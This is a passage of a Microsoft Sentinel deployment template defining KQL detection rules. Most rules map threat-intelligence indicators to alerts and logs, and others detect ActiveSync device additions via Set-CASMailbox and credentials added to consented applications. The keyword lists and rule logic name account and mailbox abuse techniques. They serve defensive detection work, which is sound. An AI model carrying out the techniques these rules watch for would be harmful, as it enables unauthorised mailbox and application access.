          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Hostname"
                },
                {
                  "identifier": "HostName",
                  "columnName": "Name"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "FileHashType"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHash"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/484be175-48c7-4595-9a39-b007ba79395d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/484be175-48c7-4595-9a39-b007ba79395d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Domain entity to SecurityAlert",
          "description": "Identifies a match in SecurityAlert table from any Domain IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet SecurityAlerts = SecurityAlert\n| where TimeGenerated > ago(dt_lookBack)\n| extend domain = todynamic(dynamic_to_json(extract_all(@\"(((xn--)?[a-z0-9\\-]+\\.)+([a-z]+|(xn--[a-z0-9]+)))\", dynamic([1]), tolower(Entities))))\n| where isnotempty(domain)\n| mv-expand domain\n| extend domain = tostring(domain)\n| extend EntitiesDynamicArray = parse_json(Entities)\n| mv-apply EntitiesDynamicArray on\n    (summarize\n        HostName = take_anyif(tostring(EntitiesDynamicArray.HostName), EntitiesDynamicArray.Type == \"host\"),\n        IP_addr = take_anyif(tostring(EntitiesDynamicArray.Address), EntitiesDynamicArray.Type == \"ip\")\n    )\n| extend Alert_TimeGenerated = TimeGenerated\n| extend Alert_Description = Description;\nlet AlertDomains = SecurityAlerts\n| distinct domain\n| summarize make_list(domain);\nlet Domain_Indicators = materialize(ThreatIntelligenceIndicator\n| where isnotempty(DomainName)\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend TI_DomainEntity = tolower(DomainName)\n| where TI_DomainEntity in (AlertDomains)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\");\nDomain_Indicators\n// Using innerunique to keep performance fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (SecurityAlerts) on $left.TI_DomainEntity == $right.domain\n| where Alert_TimeGenerated < ExpirationDateTime\n| summarize Alert_TimeGenerated = arg_max(Alert_TimeGenerated, *) by IndicatorId, AlertName\n| project Alert_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, DomainName, AlertName, Alert_Description, ProviderName, AlertSeverity, ConfidenceLevel, HostName, IP_addr, Url, Entities, Type, TI_DomainEntity\n| extend timestamp = Alert_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "87890d78-3e05-43ec-9ab9-ba32f4e01250",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IP_addr"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0c18d8fa-01a1-44b1-8dee-50fc6a889428')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0c18d8fa-01a1-44b1-8dee-50fc6a889428')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map URL Entity to SecurityAlert Data",
          "description": "This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in SecurityAlert data.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet URLRegex = \"((https?|ftp|ldap|wss?|file):\\\\/\\\\/(([\\\\:\\\\%\\\\w\\\\_\\\\-]+(\\\\.|@))*((xn--)?[a-zA-Z0-9\\\\-]+\\\\.)+(xn--[a-z0-9]+|[A-Za-z]+)|\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{0,3})[.,:\\\\w@?^=%&\\\\/~+#-]*[\\\\w@?^=%&\\\\/~+#-])\";\nlet SecurityEvents = materialize(SecurityAlert\n  | where TimeGenerated >= ago(dt_lookBack)\n  | extend MSTI = case(AlertName has \"TI map\" and VendorName == \"Microsoft\" and ProductName == 'Azure Sentinel', true, false)\n  | where MSTI == false\n  // Extract URL from JSON data\n  | mv-expand parse_json(Entities)\n  | where isnotempty(Entities.Url) or isnotempty(Entities.Urls)\n  | extend Url = coalesce(Entities.Url, Entities.Urls)\n  | mv-expand Url\n  | extend Url = tolower(Url)\n  // Extract hostname from JSON data for entity mapping\n  | extend Compromised_Host = tostring(parse_json(ExtendedProperties).[\"Compromised Host\"])\n  | extend Alert_TimeGenerated = TimeGenerated);\nlet EventUrls = materialize(SecurityEvents | distinct Url | summarize make_list(Url));\nThreatIntelligenceIndicator\n| where isnotempty(Url)\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend Url = tolower(Url)\n| where tolower(Url) in (EventUrls)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\" \n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (SecurityEvents) on Url\n| where Alert_TimeGenerated < ExpirationDateTime\n| summarize Alert_TimeGenerated = arg_max(Alert_TimeGenerated, *) by IndicatorId, AlertName\n| project timestamp = Alert_TimeGenerated, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, AlertName, AlertSeverity, Description, Url, Compromised_Host\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "f30a47c1-65fb-42b1-a7f4-00941c12550b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Compromised_Host"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.8"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/23f758da-4757-4978-9aac-6b73bbd7a43d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/23f758da-4757-4978-9aac-6b73bbd7a43d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Email entity to SecurityEvent",
          "description": "Identifies a match in SecurityEvent table from any Email IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nThreatIntelligenceIndicator\n//Filtering the table for Email related IOCs\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n(union isfuzzy=true\n(SecurityEvent\n| where TimeGenerated >= ago(dt_lookBack) and isnotempty(TargetUserName)\n//Normalizing the column to lower case for exact match with EmailSenderAddress column\n| extend TargetUserName = tolower(TargetUserName)\n// renaming timestamp column so it is clear the log this came from SecurityEvent table\n| extend SecurityEvent_TimeGenerated = TimeGenerated\n),\n(WindowsEvent\n| where TimeGenerated >= ago(dt_lookBack)\n| extend TargetUserName = tostring(EventData.TargetUserName)\n| where isnotempty(TargetUserName)\n//Normalizing the column to lower case for exact match with EmailSenderAddress column\n| extend TargetUserName = tolower(TargetUserName)\n// renaming timestamp column so it is clear the log this came from SecurityEvent table\n| extend SecurityEvent_TimeGenerated = TimeGenerated\n))\n)\non $left.EmailSenderAddress == $right.TargetUserName\n| where SecurityEvent_TimeGenerated < ExpirationDateTime\n| summarize SecurityEvent_TimeGenerated = arg_max(SecurityEvent_TimeGenerated, *) by IndicatorId, TargetUserName\n| project SecurityEvent_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\nEmailSenderName, EmailRecipient, EmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, Computer, EventID, TargetUserName, Activity, IpAddress, AccountType,\nLogonTypeName, LogonProcessName, Status, SubStatus\n| extend HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n| extend timestamp = SecurityEvent_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2fc5d810-c9cc-491a-b564-841427ae0e50",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUserName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.3.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3804fc06-73f1-45b9-ba08-bf71da498a58')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3804fc06-73f1-45b9-ba08-bf71da498a58')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Email access via active sync",
          "description": "This query detects attempts to add attacker devices as allowed IDs for active sync using the Set-CASMailbox command.\nThis technique was seen in relation to Solorigate attack but the results can indicate potential malicious activity used in different attacks.\n- Note that this query can be changed to use the KQL \"has_all\" operator, which hasn't yet been documented officially, but will be soon.\n  In short, \"has_all\" will only match when the referenced field has all strings in the list.\n- Refer to Set-CASMailbox syntax: https://docs.microsoft.com/powershell/module/exchange/set-casmailbox?view=exchange-ps",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet cmdList = dynamic([\"Set-CASMailbox\",\"ActiveSyncAllowedDeviceIDs\",\"add\"]);\n(union isfuzzy=true\n(\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4688\n| where CommandLine has_all (cmdList)\n| project Type, TimeGenerated, Computer, Account, SubjectDomainName, SubjectUserName, Process, ParentProcessName, CommandLine\n| extend timestamp = TimeGenerated, AccountEntity = Account, HostEntity = Computer\n),\n( WindowsEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4688\n| where EventData has_all (cmdList)\n| extend CommandLine = tostring(EventData.CommandLine) \n| where CommandLine has_all (cmdList)\n| extend Account =  strcat(tostring(EventData.SubjectDomainName),\"\\\\\", tostring(EventData.SubjectUserName))\n| extend SubjectUserName = tostring(EventData.SubjectUserName)\n| extend SubjectDomainName = tostring(EventData.SubjectDomainName)\n| extend NewProcessName = tostring(EventData.NewProcessName)\n| extend Process=tostring(split(NewProcessName, '\\\\')[-1])\n| extend ParentProcessName = tostring(EventData.ParentProcessName)\n| project Type, TimeGenerated, Computer, Account, SubjectDomainName, SubjectUserName, Process, ParentProcessName, CommandLine\n| extend timestamp = TimeGenerated, AccountEntity = Account, HostEntity = Computer\n),\n(\nDeviceProcessEvents\n| where TimeGenerated >= ago(timeframe)\n| where InitiatingProcessCommandLine has_all (cmdList)\n| project Type, TimeGenerated, DeviceName, AccountName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessParentFileName,  InitiatingProcessCommandLine\n| extend timestamp = TimeGenerated, AccountDomain = InitiatingProcessAccountDomain, AccountName = InitiatingProcessAccountName, HostEntity = DeviceName\n),\n(\nEvent\n| where TimeGenerated > ago(timeframe)\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key=tostring(['@Name']), Value=['#text']\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, EventID, UserName, RenderedDescription, MG, ManagementGroupName, Type, _ResourceId)\n| where TimeGenerated >= ago(timeframe)\n| where CommandLine has_all (cmdList)\n| extend Type = strcat(Type, \": \", Source)\n| project Type, TimeGenerated, Computer, User, Process, ParentImage, CommandLine\n| extend timestamp = TimeGenerated, AccountEntity = User, HostEntity = Computer\n)\n)\n| extend HostName = tostring(split(HostEntity, \".\")[0]), DomainIndex = toint(indexof(HostEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(HostEntity, DomainIndex + 1), HostEntity)\n| extend AccountName = tostring(split(AccountEntity, @'\\')[1]), AccountDomain = tostring(split(AccountEntity, @'\\')[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1068",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2f561e20-d97b-4b13-b02d-18b34af6e87c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountDomain"
                },
                {
                  "identifier": "FullName",
                  "columnName": "AccountEntity"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostEntity"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c5e4aeb0-0229-4fd8-b2f2-999f1850b979')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c5e4aeb0-0229-4fd8-b2f2-999f1850b979')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Domain entity to PaloAlto CommonSecurityLog",
          "description": "Identifies a match in PaloAlto CommonSecurityLog table from any Domain IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h; // Look back 1 hour\nlet ioc_lookBack = 14d; // Look back 14 days\n// Create a list of top-level domains (TLDs) from the threat feed data for later validation\nlet SecurityLog = materialize(\n  CommonSecurityLog\n    // Filter common security logs based on the specified time range\n    | extend IngestionTime = ingestion_time()\n    | where IngestionTime > ago(dt_lookBack)\n    | where DeviceEventClassID =~ 'url'\n    // Uncomment the line below to only alert on allowed connections\n    //| where DeviceAction !~ \"block-url\"\n    // Extract the domain from RequestURL, if not present, extract it from AdditionalExtensions\n    | extend PA_Url = column_ifexists(\"RequestURL\", \"None\")\n    | extend PA_Url = iif(isempty(PA_Url) and AdditionalExtensions !startswith \"PanOS\", extract(\"([^\\\\\\\"]+)\", 1, tolower(AdditionalExtensions)), trim('\"', PA_Url))\n    | extend PA_Url = iif(PA_Url !startswith \"http://\" and ApplicationProtocol !~ \"ssl\", strcat('http://', PA_Url), iif(PA_Url !startswith \"https://\" and ApplicationProtocol =~ \"ssl\", strcat('https://', PA_Url), PA_Url))\n    | extend Domain = trim('\"', tostring(parse_url(PA_Url).Host))\n    | where isnotempty(Domain)\n    | extend Domain = tolower(Domain)\n    | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n);\nlet LogDomains = SecurityLog | distinct Domain | summarize make_list(Domain);\n// Retrieve threat intelligence indicators within the specified time range\nlet Domain_Indicators = materialize(\n    ThreatIntelligenceIndicator\n    | where isnotempty(DomainName)\n    | where TimeGenerated >= ago(ioc_lookBack)\n    | extend TI_DomainEntity = tolower(DomainName)\n    | where TI_DomainEntity in (LogDomains)\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n    | where Active == true and ExpirationDateTime > now());\n// Join threat intelligence indicators with common security logs\nDomain_Indicators | join kind=innerunique (SecurityLog) on $left.TI_DomainEntity == $right.Domain\n| where CommonSecurityLog_TimeGenerated < ExpirationDateTime\n| summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *) by IndicatorId\n| project CommonSecurityLog_TimeGenerated, Description, ActivityGroupNames, PA_Url, Domain, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, DeviceAction, DestinationIP, DestinationPort, DeviceName, SourceIP, SourcePort, ApplicationProtocol, RequestMethod, Type, TI_DomainEntity\n| extend timestamp = CommonSecurityLog_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "dd0a6029-ecef-4507-89c4-fc355ac52111",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "PA_Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/85f7a572-a2ec-48f6-bffe-9efca66235d4')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/85f7a572-a2ec-48f6-bffe-9efca66235d4')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map File Hash to Security Event",
          "description": "Identifies a match in Security Event data from any File Hash IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nThreatIntelligenceIndicator\n| where isnotempty(FileHashValue)\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend FileHashValue = toupper(FileHashValue)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique ( union isfuzzy=true\n  (SecurityEvent | where TimeGenerated >= ago(dt_lookBack)\n      | where EventID in (\"8003\",\"8002\",\"8005\")\n      | where isnotempty(FileHash)\n      | extend SecurityEvent_TimeGenerated = TimeGenerated, Event = EventID, FileHash = toupper(FileHash)\n  ),\n  (WindowsEvent | where TimeGenerated >= ago(dt_lookBack)\n      | where EventID in (\"8003\",\"8002\",\"8005\")\n      | where isnotempty(EventData.FileHash)\n      | extend SecurityEvent_TimeGenerated = TimeGenerated, Event = EventID, FileHash = toupper(EventData.FileHash)\n  )\n)\non $left.FileHashValue == $right.FileHash\n| where SecurityEvent_TimeGenerated < ExpirationDateTime\n| summarize SecurityEvent_TimeGenerated = arg_max(SecurityEvent_TimeGenerated, *) by IndicatorId, FileHash\n| project SecurityEvent_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\nProcess, FileHash, Computer, Account, Event, FileHashValue, FileHashType\n| extend NTDomain = tostring(split(Account, '\\\\', 0)[0]), Name = tostring(split(Account, '\\\\', 1)[0])\n| extend HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.')) \n| extend timestamp = SecurityEvent_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a7427ed7-04b4-4e3b-b323-08b981b9b4bf",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Account"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "NTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Value",
                  "columnName": "FileHashValue"
                },
                {
                  "identifier": "Algorithm",
                  "columnName": "FileHashType"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/43b1afd5-383e-4551-b983-32b2b4778b1a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/43b1afd5-383e-4551-b983-32b2b4778b1a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Credential added after admin consented to Application",
          "description": "This query will identify instances where Service Principal credentials were added to an application by one user after the application was granted admin consent rights by another user.\n If a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential.\n Additional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow.\n For further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities",
          "severity": "Medium",
          "enabled": true,
          "query": "let auditLookbackStart = 2d;\nlet auditLookbackEnd = 1d;\nAuditLogs\n| where TimeGenerated >= ago(auditLookbackStart)\n| where OperationName =~ \"Consent to application\" \n| where Result =~ \"success\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"ServicePrincipal\"\n      | extend targetResourceName = tostring(TargetResource.displayName),\n               targetResourceID = tostring(TargetResource.id),\n               targetResourceType = tostring(TargetResource.type),\n               targetModifiedProp = TargetResource.modifiedProperties\n  )\n| mv-apply Property = targetModifiedProp on \n  (\n      where Property.displayName =~ \"ConsentContext.IsAdminConsent\"\n      | extend isAdminConsent = trim(@'\"',tostring(Property.newValue))\n  )\n| mv-apply Property = targetModifiedProp on \n  (\n      where Property.displayName =~ \"ConsentAction.Permissions\"\n      | extend Consent_TargetPermissions = trim(@'\"',tostring(Property.newValue))\n  )\n| mv-apply Property = targetModifiedProp on \n  (\n      where Property.displayName =~ \"TargetId.ServicePrincipalNames\"\n      | extend Consent_TargetServicePrincipalNames = tostring(extract_all(@\"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\",trim(@'\"',tostring(Property.newValue)))[0])\n  )\n| extend Consent_InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend Consent_InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend Consent_InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend Consent_InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend Consent_InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend Consent_InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| join kind=inner ( \nAuditLogs\n| where TimeGenerated  >= ago(auditLookbackEnd)\n| where OperationName =~ \"Add service principal credentials\"\n| where Result =~ 